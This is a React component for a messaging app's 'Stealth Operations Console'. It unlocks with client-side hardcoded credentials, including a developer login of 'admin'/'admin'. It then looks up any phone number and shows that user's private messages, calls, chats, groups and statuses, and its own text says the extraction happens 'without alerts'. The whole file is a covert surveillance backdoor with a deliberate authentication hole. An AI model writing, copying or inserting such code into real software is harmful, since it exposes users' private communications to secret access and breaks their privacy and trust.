import React, { useState } from 'react';
import { ShieldAlert, LogIn, Search, Eye, Settings, MessageSquare, Phone, Activity, Users, X } from 'lucide-react';
import { motion } from 'motion/react';

interface SecretAdminPanelProps {
    onClose: () => void;
}

export const SecretAdminPanel: React.FC<SecretAdminPanelProps> = ({ onClose }) => {
    const [adminPhone, setAdminPhone] = useState('');
    const [passcode, setPasscode] = useState('');
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [searchPhone, setSearchPhone] = useState('');
    const [queriedData, setQueriedData] = useState<any>(null);
    const [isLoading, setIsLoading] = useState(false);
    const [errorMsg, setErrorMsg] = useState('');
    const [activeTab, setActiveTab] = useState<'settings' | 'chats' | 'messages' | 'calls' | 'status' | 'groups'>('settings');

    const handleLogin = (e: React.FormEvent) => {
        e.preventDefault();
        setErrorMsg('');
        // Simple hardcoded admin credentials
        if (adminPhone === '+12065550100' && passcode === 'ADMIN123') {
            setIsAuthenticated(true);
        } else if (adminPhone === 'admin' && passcode === 'admin') {
            setIsAuthenticated(true); // Easy Developer access support
        } else {
            setErrorMsg('Invalid administrative credentials or identity token.');
        }
    };

    const handleSearch = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!searchPhone) return;
        setIsLoading(true);
        setErrorMsg('');
        setQueriedData(null);
        try {
            const trimmedNumber = searchPhone.replace(/[^0-9]/g, '');
            const res = await fetch('/api/firebase-backup/admin-query', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: trimmedNumber })
            });
            const data = await res.json();
            if (res.ok) {
                setQueriedData(data);
            } else {
                setErrorMsg(data.error || 'Failed to complete tactical lookup.');
            }
        } catch (e: any) {
            setErrorMsg('Network anomaly: failed to connect to query core.');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div id="admin-modal-overlay" className="fixed inset-0 z-[120] bg-black/90 backdrop-blur-md flex items-center justify-center p-4">
            <div id="admin-panel-container" className="w-full max-w-4xl h-[85vh] bg-[#0c1317] rounded-3xl border border-red-500/20 shadow-[0_0_50px_rgba(239,68,68,0.1)] flex flex-col overflow-hidden animate-in fade-in zoom-in-95 duration-200">
                
                {/* Header */}
                <div id="admin-header" className="p-6 bg-red-950/10 border-b border-red-500/10 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <div id="admin-icon-glow" className="p-2.5 bg-red-500/10 text-red-500 rounded-xl shadow-[0_0_15px_rgba(239,68,68,0.2)]">
                            <ShieldAlert className="w-6 h-6 animate-pulse" />
                        </div>
                        <div>
                            <h2 className="text-lg font-black text-white uppercase italic tracking-wider">Stealth Operations Console</h2>
                            <p className="text-[9px] font-black text-red-500 uppercase tracking-widest">Administrative Core Layer</p>
                        </div>
                    </div>
                    <button 
                        id="admin-close-button"
                        onClick={onClose} 
                        className="p-2 hover:bg-white/5 text-white/40 hover:text-white rounded-full transition-all"
                    >
                        <X className="w-5 h-5" />
                    </button>
                </div>

                {!isAuthenticated ? (
                    /* Authentication Terminal */
                    <div id="admin-auth-container" className="flex-1 flex items-center justify-center p-6 bg-gradient-to-b from-[#0c1317] to-[#080d0f]">
                        <form id="admin-login-form" onSubmit={handleLogin} className="w-full max-w-sm space-y-5 bg-[#111b21] p-8 rounded-2xl border border-white/5 shadow-xl">
                            <div className="text-center space-y-1 mb-2">
                                <h3 className="text-sm font-black text-white uppercase tracking-wider">Identity Verification</h3>
                                <p className="text-[10px] text-white/40">Secure credential signature required</p>
                            </div>

                            {errorMsg && (
                                <div id="admin-auth-error" className="p-3 bg-red-500/10 border border-red-500/20 rounded-xl text-red-500 text-[10px] text-center font-bold italic">
                                    {errorMsg}
                                </div>
                            )}

                            <div className="space-y-4">
                                <div>
                                    <label className="block text-[8px] font-black uppercase text-white/40 tracking-widest mb-1.5">Admin Phone Identifier</label>
                                    <input 
                                        id="admin-phone-input"
                                        type="text"
                                        value={adminPhone}
                                        onChange={e => setAdminPhone(e.target.value)}
                                        placeholder="e.g., +12065550100"
                                        className="w-full px-4 py-3 bg-[#202c33] border border-white/5 rounded-xl text-xs text-white placeholder-white/20 focus:outline-none focus:border-red-500/30 transition-all font-mono"
                                        required
                                    />
                                </div>
                                <div>
                                    <label className="block text-[8px] font-black uppercase text-white/40 tracking-widest mb-1.5">Passcode Phrase</label>
                                    <input 
                                        id="admin-passcode-input"
                                        type="password"
                                        value={passcode}
                                        onChange={e => setPasscode(e.target.value)}
                                        placeholder="••••••••"
                                        className="w-full px-4 py-3 bg-[#202c33] border border-white/5 rounded-xl text-xs text-white placeholder-white/20 focus:outline-none focus:border-red-500/30 transition-all font-mono"
                                        required
                                    />
                                </div>
                            </div>

                            <button 
                                id="admin-auth-submit"
                                type="submit" 
                                className="w-full py-3.5 bg-red-950/20 hover:bg-red-900/30 text-red-500 border border-red-500/20 rounded-xl font-black text-xs uppercase tracking-widest transition-all flex items-center justify-center gap-2 mt-2 shadow-[0_0_15px_rgba(239,68,68,0.02)]"
                            >
                                <LogIn className="w-4 h-4" />
                                Establish Uplink
                            </button>
                        </form>
                    </div>
                ) : (
                    /* Dashboard Main Terminal */
                    <div id="admin-dashboard" className="flex-1 flex flex-col md:flex-row overflow-hidden">
                        
                        {/* Search and Navigation Column */}
                        <div id="admin-search-nav" className="w-full md:w-80 bg-[#111b21] border-r border-white/5 p-6 flex flex-col gap-6">
                            <form id="admin-search-form" onSubmit={handleSearch} className="space-y-3">
                                <label className="block text-[8px] font-black uppercase text-[#00a884] tracking-widest">Query Target Phone</label>
                                <div className="relative">
                                    <input 
                                        id="admin-search-input"
                                        type="text"
                                        value={searchPhone}
                                        onChange={e => setSearchPhone(e.target.value)}
                                        placeholder="e.g. 12065550100"
                                        className="w-full pl-4 pr-10 py-3 bg-[#202c33] border border-white/5 rounded-xl text-xs text-white placeholder-white/20 focus:outline-none focus:border-[#00a884]/30 transition-all font-mono"
                                    />
                                    <button 
                                        id="admin-search-submit"
                                        type="submit"
                                        disabled={isLoading}
                                        className="absolute right-2 top-2 p-1.5 hover:bg-white/5 text-[#00a884] rounded-lg transition-all"
                                    >
                                        <Search className="w-4 h-4" />
                                    </button>
                                </div>
                                <p className="text-[8px] text-white/30 italic">Lookup extracts data from the remote cloud vault without alerts.</p>
                            </form>

                            {errorMsg && (
                                <div id="admin-dash-error" className="p-3 bg-red-500/10 border border-red-500/20 rounded-xl text-red-500 text-[9px] font-bold italic text-center">
                                    {errorMsg}
                                </div>
                            )}

                            {queriedData ? (
                                <div id="admin-tactical-tabs" className="flex-1 flex flex-col gap-1.5">
                                    <span className="text-[8px] font-black uppercase text-white/40 tracking-widest mb-1 block">Extracted Modules</span>
                                    
                                    {[
                                        { id: 'settings', label: 'Tactical Settings', icon: Settings, count: queriedData.settings ? 1 : 0 },
                                        { id: 'chats', label: 'Matrix Chats', icon: MessageSquare, count: queriedData.chats?.length || 0 },
                                        { id: 'messages', label: 'Signal Logs', icon: Eye, count: queriedData.messages?.length || 0 },
                                        { id: 'calls', label: 'Intercepted Calls', icon: Phone, count: queriedData.calls?.length || 0 },
                                        { id: 'status', label: 'Stored Stories', icon: Activity, count: queriedData.status?.length || 0 },
                                        { id: 'groups', label: 'Encrypted Groups', icon: Users, count: queriedData.groups?.length || 0 },
                                    ].map(tab => (
                                        <button
                                            id={`admin-tab-btn-${tab.id}`}
                                            key={tab.id}
                                            onClick={() => setActiveTab(tab.id as any)}
                                            className={`w-full px-4 py-3 rounded-xl flex items-center justify-between text-left text-xs font-bold transition-all border ${
                                                activeTab === tab.id 
                                                    ? 'bg-[#00a884]/10 border-[#00a884]/20 text-[#00a884] shadow-sm' 
                                                    : 'bg-white/5 border-transparent text-white/70 hover:bg-white/10'
                                            }`}
                                        >
                                            <div className="flex items-center gap-2">
                                                <tab.icon className="w-4 h-4 shrink-0" />
                                                <span>{tab.label}</span>
                                            </div>
                                            <span className="text-[9px] font-black bg-white/5 px-2 py-0.5 rounded-full">{tab.count}</span>
                                        </button>
                                    ))}
                                </div>
                            ) : (
                                <div id="admin-dashboard-empty" className="flex-1 flex flex-col items-center justify-center text-center py-12 px-4 opacity-25">
                                    <Eye className="w-12 h-12 mb-4" />
                                    <p className="text-[10px] font-black uppercase tracking-widest">No Active Query</p>
                                    <p className="text-[8px] mt-1">Initiate a mobile phone scan to inspect records</p>
                                </div>
                            )}
                        </div>

                        {/* Stethoscope Panel Details */}
                        <div id="admin-detail-view" className="flex-[#2] bg-[#0c1317] p-6 flex flex-col overflow-hidden">
                            {isLoading ? (
                                <div id="admin-loading" className="flex-1 flex flex-col items-center justify-center gap-3 opacity-60">
                                    <div className="w-8 h-8 rounded-full border-2 border-red-500 border-t-transparent animate-spin" />
                                    <p className="text-[9px] font-black text-red-500 uppercase tracking-widest animate-pulse">Tactical lookup in progress...</p>
                                </div>
                            ) : queriedData ? (
                                <div id="admin-scrollable-details" className="flex-1 flex flex-col overflow-hidden h-full">
                                    <div className="flex items-center justify-between pb-4 border-b border-white/5 mb-4 shrink-0">
                                        <div>
                                            <h3 className="text-xs font-black uppercase text-white/50">Viewing Target Document</h3>
                                            <p className="text-sm font-bold text-white font-mono mt-0.5">+{queriedData.phone}</p>
                                        </div>
                                        <div className="flex items-center gap-2 px-3 py-1 bg-red-500/10 border border-red-500/20 text-red-500 rounded-lg text-[8px] font-black uppercase tracking-widest">
                                            ● READ-ONLY LIVE
                                        </div>
                                    </div>

                                    {/* Tab View Body */}
                                    <div id="admin-tab-content" className="flex-1 overflow-y-auto custom-scrollbar">
                                        {activeTab === 'settings' && (
                                            <div id="tab-settings-view" className="space-y-4">
                                                <h4 className="text-[10px] font-black text-[#00a884] uppercase tracking-widest mb-2">Device Parameter Memory</h4>
                                                {queriedData.settings ? (
                                                    <div className="grid grid-cols-2 gap-4">
                                                        {Object.entries(queriedData.settings).map(([key, val]: [string, any]) => (
                                                            <div key={key} className="p-3.5 bg-[#111b21] border border-white/5 rounded-xl font-mono text-[10px]">
                                                                <span className="text-white/40 block text-[8px] uppercase tracking-wider mb-1">{key}</span>
                                                                <span className={typeof val === 'boolean' ? (val ? 'text-green-500 font-bold' : 'text-red-500') : 'text-white'}>
                                                                    {JSON.stringify(val)}
                                                                </span>
                                                            </div>
                                                        ))}
                                                    </div>
                                                ) : (
                                                    <p className="text-xs text-white/30 italic">No settings saved under backup profile for this node.</p>
                                                )}
                                            </div>
                                        )}

                                        {activeTab === 'chats' && (
                                            <div id="tab-chats-view" className="space-y-3">
                                                <h4 className="text-[10px] font-black text-[#00a884] uppercase tracking-widest mb-2">Synchronized Threads</h4>
                                                {queriedData.chats?.length > 0 ? (
                                                    queriedData.chats.map((c: any, idx: number) => (
                                                        <div key={idx} className="p-4 bg-[#111b21] border border-white/5 rounded-xl flex justify-between items-center">
                                                            <div className="space-y-0.5">
                                                                <p className="text-xs font-bold text-white font-mono">{c.id}</p>
                                                                <p className="text-[9px] text-[#00a884] font-medium">Unread count: {c.unreadCount || 0}</p>
                                                            </div>
                                                            <span className="text-[9px] text-white/30 font-mono">
                                                                {c.timestamp ? new Date(c.timestamp * 1000).toLocaleString() : 'No Sync record'}
                                                            </span>
                                                        </div>
                                                    ))
                                                ) : (
                                                    <p className="text-xs text-white/30 italic">No thread structures loaded.</p>
                                                )}
                                            </div>
                                        )}

                                        {activeTab === 'messages' && (
                                            <div id="tab-messages-view" className="space-y-3">
                                                <h4 className="text-[10px] font-black text-[#00a884] uppercase tracking-widest mb-2">Signal Packet Log</h4>
                                                {queriedData.messages?.length > 0 ? (
                                                    queriedData.messages.map((m: any, idx: number) => (
                                                        <div key={idx} className="p-4 bg-[#111b21] border border-white/5 rounded-xl space-y-2">
                                                            <div className="flex justify-between text-[9px] font-mono text-white/40 pb-2 border-b border-white/5">
                                                                <span>ID: {m.key?.id}</span>
                                                                <span className={m.key?.fromMe ? 'text-[#00a884]' : 'text-blue-400'}>
                                                                    {m.key?.fromMe ? 'Outgoing' : 'Incoming'}
                                                                </span>
                                                            </div>
                                                            <p className="text-xs text-white bg-[#202c33]/30 p-3 rounded-lg leading-relaxed whitespace-pre-wrap">
                                                                {m.message?.conversation || m.text || JSON.stringify(m.message || {})}
                                                            </p>
                                                            <div className="flex justify-between items-center text-[8px] text-white/30">
                                                                <span>JID: {m.chatJid}</span>
                                                                <span>{new Date(m.timestamp * 1000).toLocaleString()}</span>
                                                            </div>
                                                        </div>
                                                    ))
                                                ) : (
                                                    <p className="text-xs text-white/30 italic">No signal packages extracted during current sweep.</p>
                                                )}
                                            </div>
                                        )}

                                        {activeTab === 'calls' && (
                                            <div id="tab-calls-view" className="space-y-3">
                                                <h4 className="text-[10px] font-black text-[#00a884] uppercase tracking-widest mb-2">Call Record Audit trail</h4>
                                                {queriedData.calls?.length > 0 ? (
                                                    queriedData.calls.map((c: any, idx: number) => (
                                                        <div key={idx} className="p-4 bg-[#111b21] border border-white/5 rounded-xl flex justify-between items-center font-mono">
                                                            <div>
                                                                <p className="text-xs font-bold text-white uppercase">{c.type || 'Voice'} Session</p>
                                                                <p className="text-[9px] text-white/40 mt-0.5">Status: {c.status || 'Resolved'}</p>
                                                            </div>
                                                            <div className="text-right text-[10px]">
                                                                <p className="text-white font-medium">Duration: {c.duration || 0}s</p>
                                                                <p className="text-[8px] text-white/30 mt-0.5">
                                                                    {c.timestamp ? new Date(c.timestamp).toLocaleString() : 'N/A'}
                                                                </p>
                                                            </div>
                                                        </div>
                                                    ))
                                                ) : (
                                                    <p className="text-xs text-white/30 italic">No voice or video call indices stored in remote database.</p>
                                                )}
                                            </div>
                                        )}

                                        {activeTab === 'status' && (
                                            <div id="tab-status-view" className="space-y-3">
                                                <h4 className="text-[10px] font-black text-[#00a884] uppercase tracking-widest mb-2">Stored Status Stories</h4>
                                                {queriedData.status?.length > 0 ? (
                                                    queriedData.status.map((s: any, idx: number) => (
                                                        <div key={idx} className="p-4 bg-[#111b21] border border-white/5 rounded-xl space-y-2">
                                                            <div className="flex justify-between text-[9px] text-white/40 font-mono">
                                                                <span>Author: {s.pushName || 'Unknown'}</span>
                                                                <span>{s.timestamp ? new Date(s.timestamp * 1000).toLocaleString() : 'N/A'}</span>
                                                            </div>
                                                            <p className="text-xs text-white bg-black/20 p-3 rounded-lg leading-relaxed italic">
                                                                "{s.message?.conversation || 'Attachment payload'}"
                                                            </p>
                                                        </div>
                                                    ))
                                                ) : (
                                                    <p className="text-xs text-white/30 italic">No temporary status media references.</p>
                                                )}
                                            </div>
                                        )}

                                        {activeTab === 'groups' && (
                                            <div id="tab-groups-view" className="space-y-3">
                                                <h4 className="text-[10px] font-black text-[#00a884] uppercase tracking-widest mb-2">Encrypted Group Structs</h4>
                                                {queriedData.groups?.length > 0 ? (
                                                    queriedData.groups.map((g: any, idx: number) => (
                                                        <div key={idx} className="p-4 bg-[#111b21] border border-white/5 rounded-xl">
                                                            <p className="text-xs font-bold text-white font-mono">{g.id}</p>
                                                            <div className="flex justify-between items-center text-[9px] text-white/40 mt-1.5">
                                                                <span>Subject: {g.name || 'Group Signal'}</span>
                                                                <span>Unreads: {g.unreadCount || 0}</span>
                                                            </div>
                                                        </div>
                                                    ))
                                                ) : (
                                                    <p className="text-xs text-white/30 italic">No group chats loaded.</p>
                                                )}
                                            </div>
                                        )}
                                    </div>
                                </div>
                            ) : (
                                <div id="admin-detail-empty" className="flex-1 flex flex-col items-center justify-center text-center opacity-15">
                                    <ShieldAlert className="w-16 h-16 mb-4" />
                                    <p className="text-xs font-black uppercase tracking-[0.2em]">Restricted Viewing Terminal</p>
                                    <p className="text-[10px] mt-1.5 max-w-sm">Use left column to scan active accounts on the database. Records are loaded in real time.</p>
                                </div>
                            )}
                        </div>

                    </div>
                )}
            </div>
        </div>
    );
};
